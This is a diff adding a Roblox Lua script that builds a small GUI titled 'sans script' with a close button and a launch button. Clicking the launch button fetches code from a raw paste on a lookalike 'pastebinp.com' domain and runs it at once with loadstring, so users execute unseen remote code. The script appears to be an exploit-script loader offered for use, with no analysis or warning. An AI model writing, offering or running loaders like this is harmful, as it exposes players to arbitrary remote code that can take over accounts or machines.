@@ -1,0 +1,65 @@
+
+local player = game:GetService("Players").LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "sans script by Nebula_Zorua"
+gui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame")
+frame.Name = "MainFrame"
+frame.Parent = gui
+frame.Size = UDim2.new(0, 320, 0, 170)
+frame.Position = UDim2.new(0.5, -160, 0.5, -85)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+
+local title = Instance.new("TextLabel")
+title.Parent = frame
+title.Size = UDim2.new(1, -30, 0, 30)
+title.Position = UDim2.new(0, 10, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "sans script made by Nebula_Zorua"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 20
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Parent = frame
+closeBtn.Size = UDim2.new(0, 30, 0, 30)
+closeBtn.Position = UDim2.new(1, -30, 0, 0)
+closeBtn.Text = "ungui"
+closeBtn.Font = Enum.Font.SourceSansBold
+closeBtn.TextSize = 18
+closeBtn.TextColor3 = Color3.new(1, 1, 1)
+closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+closeBtn.MouseButton1Click:Connect(function()
+ gui:Destroy()
+end)
+
+local button = Instance.new("TextButton")
+button.Parent = frame
+button.Size = UDim2.new(0.8, 0, 0, 40)
+button.Position = UDim2.new(0.1, 0, 0.4, 0)
+button.Text = "sans script"
+button.Font = Enum.Font.SourceSans
+button.TextSize = 18
+button.BackgroundColor3 = Color3.fromRGB(80, 170, 80)
+button.TextColor3 = Color3.new(1, 1, 1)
+
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebinp.com/raw/hVfngii9"))()
+end)
+
+local info = Instance.new("TextLabel")
+info.Parent = frame
+info.Size = UDim2.new(1, -20, 0, 60)
+info.Position = UDim2.new(0, 10, 0.7, 0)
+info.BackgroundTransparency = 1
+info.TextWrapped = true
+info.Text = "script by my fan name COOL_bacon-y4b"
+info.TextColor3 = Color3.fromRGB(255, 255, 255)
+info.Font = Enum.Font.SourceSans
+info.TextSize = 14
+info.TextYAlignment = Enum.TextYAlignment.Top
